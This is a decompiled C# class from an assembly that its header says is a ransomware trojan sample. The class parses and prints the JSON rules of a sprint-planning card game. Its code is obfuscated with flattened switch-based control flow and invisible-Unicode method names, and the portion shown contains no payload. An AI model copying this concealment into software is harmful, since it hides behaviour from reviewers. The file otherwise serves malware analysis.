// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: DigitShap, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AB9237C5-7B14-44B1-B37B-A2ADF34FB693
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-ed844cfae2c80b291651f15b71e1c0608612446513cb527a5753bfa831a2e348.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
label_1:
      int num1 = -378136249;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -490909587)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -401900780 ^ 2120826266;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = 145301258;
      int aIndex;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1953174979)) % 7U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 260851191;
            continue;
          case 1:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? 749682607 : (num3 = 365946219);
            continue;
          case 3:
            goto label_1;
          case 4:
            aIndex = 0;
            num1 = (int) num2 * 867812691 ^ -863227200;
            continue;
          case 5:
            ++aIndex;
            num1 = (int) num2 * -120382557 ^ -1822256137;
            continue;
          case 6:
            riskChances = numArray;
            num1 = (int) num2 * -2095744152 ^ -355403578;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = -1011972896;
      int aIndex1;
      bool flag1;
      JSONNode jsonNode;
      int aIndex2;
      bool flag2;
      bool flag3;
      int num2;
      bool flag4;
      List<Card> cardList;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -987346957)) % 25U)
        {
          case 0:
            num1 = (int) num3 * -282419574 ^ 2020884296;
            continue;
          case 1:
            num1 = -200174715;
            continue;
          case 2:
            ++aIndex2;
            num1 = (int) num3 * 2107774852 ^ -298312085;
            continue;
          case 3:
            int num4 = !flag2 ? 1034703137 : (num4 = 721194193);
            num1 = num4 ^ (int) num3 * -2102883853;
            continue;
          case 4:
            jsonNode = json[aIndex1];
            num1 = (int) num3 * 1292981906 ^ -1334575834;
            continue;
          case 5:
            num1 = (int) num3 * -905031166 ^ 631192053;
            continue;
          case 6:
            cardList = new List<Card>();
            aIndex1 = 0;
            num1 = (int) num3 * -722664443 ^ 1510732061;
            continue;
          case 8:
            ++num2;
            num1 = (int) num3 * -352192232 ^ 383680279;
            continue;
          case 9:
            num1 = (int) num3 * 330065571 ^ 171194995;
            continue;
          case 10:
            num1 = (int) num3 * 469685275 ^ 828334482;
            continue;
          case 11:
            num1 = (int) num3 * 625010555 ^ 1608230038;
            continue;
          case 12:
            goto label_1;
          case 13:
            flag4 = aIndex2 < maxImpact;
            num1 = -59865065;
            continue;
          case 14:
            int num5 = flag3 ? -2081515769 : (num5 = -609304077);
            num1 = num5 ^ (int) num3 * -1749697842;
            continue;
          case 15:
            array = cardList.ToArray();
            num1 = (int) num3 * 1730828099 ^ 626645297;
            continue;
          case 16:
            int num6 = !flag1 ? 174968438 : (num6 = 1682396738);
            num1 = num6 ^ (int) num3 * -310304758;
            continue;
          case 17:
            num2 = 0;
            num1 = -163452537;
            continue;
          case 18:
            aIndex2 = 0;
            num1 = (int) num3 * 1939029421 ^ -12924003;
            continue;
          case 19:
            flag2 = aIndex2 < maxImpact * 2;
            num1 = -786862244;
            continue;
          case 20:
            flag3 = num2 < jsonNode[aIndex2].AsInt;
            num1 = -639268451;
            continue;
          case 21:
            ++aIndex1;
            num1 = (int) num3 * 319747386 ^ 540091249;
            continue;
          case 22:
            flag1 = aIndex1 < count;
            num1 = -2043412803;
            continue;
          case 23:
            num1 = (int) num3 * -108840323 ^ 578566347;
            continue;
          case 24:
            cardList.Add(new Card()
            {
              Impact = flag4 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = -1053887176;
            continue;
          default:
            goto label_26;
        }
      }
label_26:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -800006270;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -36099121)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Rules.\u200F‪⁮‭⁫‎⁬​‌‫⁭‭⁯‬‌⁯⁮⁫⁯⁯⁪‌​⁮⁭​‏⁭‪⁫⁭⁮‍⁭⁪‏⁭⁮‌⁬‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -484080294 ^ -1339610324;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
label_1:
      int num1 = -401906886;
      int num2;
      int index;
      Card[] cards;
      Card card1;
      bool flag;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -250789096)) % 15U)
        {
          case 0:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206A⁪⁭‍‌⁫​​‭‪⁮⁮‫‫⁫⁫‮‍⁬⁫⁫⁬‫‬‬‭‮‬⁭‌‏‫‫​‭‫‮⁯⁪‮((object) card2) : (string) null;
            str1 = Rules.\u206C​‪‫‎⁬‎‍‮⁯‍‏​‍‪⁪‪‬⁬‎⁬⁭‫⁫‬‭‫‮‪⁬​‭‏⁭⁯‏‭⁬⁯⁭‮(str3, str4, " ");
            num1 = -151655559;
            continue;
          case 1:
            str2 = Rules.\u202D‬‎‎‭⁪‭‪⁭‎⁫⁫⁫⁭‪‍‬⁬‌‪‫‏‏⁮‫‎‪⁯⁪‪‏​‪⁪⁪‭⁮⁯​‮‮(str1, "\n]");
            num1 = (int) num3 * 1925144039 ^ -1816401365;
            continue;
          case 2:
            flag = num2 != card1.Type;
            num1 = (int) num3 * 1441664922 ^ -1083287605;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num3 * -1464964499 ^ 1962267801;
            continue;
          case 5:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * -1465854563 ^ -1215447895;
            continue;
          case 6:
            int num4;
            num1 = num4 = index >= cards.Length ? -2119671147 : (num4 = -914731030);
            continue;
          case 7:
            num2 = 0;
            num1 = (int) num3 * 1313932661 ^ -1989644998;
            continue;
          case 9:
            card1 = cards[index];
            num1 = -241248592;
            continue;
          case 10:
            ++index;
            num1 = (int) num3 * 556533859 ^ -22039774;
            continue;
          case 11:
            str1 = Rules.\u202D‬‎‎‭⁪‭‪⁭‎⁫⁫⁫⁭‪‍‬⁬‌‪‫‏‏⁮‫‎‪⁯⁪‪‏​‪⁪⁪‭⁮⁯​‮‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * -373630488 ^ -1523560571;
            continue;
          case 12:
            num1 = (int) num3 * -718156051 ^ 847940997;
            continue;
          case 13:
            int num5 = flag ? -1035226563 : (num5 = -757575075);
            num1 = num5 ^ (int) num3 * 1753359595;
            continue;
          case 14:
            num1 = (int) num3 * 160343843 ^ -1571971464;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u202D‬‎‎‭⁪‭‪⁭‎⁫⁫⁫⁭‪‍‬⁬‌‪‫‏‏⁮‫‎‪⁯⁪‪‏​‪⁪⁪‭⁮⁯​‮‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u200F⁭⁭​‌⁭‭​‪‍⁪‮‌‎​⁯⁪​⁪⁯‎‍‌​​‍‍‭‬‍⁪⁮​⁯⁪‮‫‭⁭‌‮()));
label_1:
      int num1 = -22000223;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -391606760)) % 6U)
        {
          case 0:
            str1 = Rules.\u206C​‪‫‎⁬‎‍‮⁯‍‏​‍‪⁪‪‬⁬‎⁬⁭‫⁫‬‭‫‮‪⁬​‭‏⁭⁯‏‭⁬⁯⁭‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u200F⁭⁭​‌⁭‭​‪‍⁪‮‌‎​⁯⁪​⁪⁯‎‍‌​​‍‍‭‬‍⁪⁮​⁯⁪‮‫‭⁭‌‮()));
            ++index;
            num1 = -1622576223;
            continue;
          case 2:
            goto label_1;
          case 3:
            index = 1;
            num1 = (int) num2 * -670754554 ^ 1158141175;
            continue;
          case 4:
            str2 = Rules.\u202D‬‎‎‭⁪‭‪⁭‎⁫⁫⁫⁭‪‍‬⁬‌‪‫‏‏⁮‫‎‪⁯⁪‪‏​‪⁪⁪‭⁮⁯​‮‮(str1, " ]");
            num1 = (int) num2 * 1853733952 ^ 1844048679;
            continue;
          case 5:
            int num3;
            num1 = num3 = index >= this.RiskChances.Length ? -1166492908 : (num3 = -119493642);
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return str2;
    }

    static string \u200F‪⁮‭⁫‎⁬​‌‫⁭‭⁯‬‌⁯⁮⁫⁯⁯⁪‌​⁮⁭​‏⁭‪⁫⁭⁮‍⁭⁪‏⁭⁮‌⁬‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u202D‬‎‎‭⁪‭‪⁭‎⁫⁫⁫⁭‪‍‬⁬‌‪‫‏‏⁮‫‎‪⁯⁪‪‏​‪⁪⁪‭⁮⁯​‮‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206A⁪⁭‍‌⁫​​‭‪⁮⁮‫‫⁫⁫‮‍⁬⁫⁫⁬‫‬‬‭‮‬⁭‌‏‫‫​‭‫‮⁯⁪‮([In] object obj0) => obj0.ToString();

    static string \u206C​‪‫‎⁬‎‍‮⁯‍‏​‍‪⁪‪‬⁬‎⁬⁭‫⁫‬‭‫‮‪⁬​‭‏⁭⁯‏‭⁬⁯⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u200F⁭⁭​‌⁭‭​‪‍⁪‮‌‎​⁯⁪​⁪⁯‎‍‌​​‍‍‭‬‍⁪⁮​⁯⁪‮‫‭⁭‌‮() => CultureInfo.InvariantCulture;
  }
}
